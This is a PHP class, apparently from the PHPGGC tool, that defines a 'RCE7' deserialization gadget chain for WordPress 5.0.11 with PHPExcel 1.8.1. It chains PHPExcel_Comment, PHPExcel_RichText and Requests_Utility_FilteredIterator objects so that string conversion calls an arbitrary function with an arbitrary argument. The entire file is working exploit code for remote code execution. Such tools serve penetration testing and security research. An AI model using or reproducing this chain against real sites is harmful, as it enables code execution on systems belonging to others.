<?php

namespace GadgetChain\WordPress\PHPExcel;

class RCE7 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '1.8.1 & WP 5.0.11';
    public static $vector = '__toString';
    public static $author = 'CyanM0un';
    public static $information = 'Tested up to WP 5.0.11 and PHPExcel 1.8.1';
    
    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \PHPExcel_Comment(
                    new \PHPExcel_RichText(
                        new \Requests_Utility_FilteredIterator([$parameter], $function)
                    )
                );
    }
}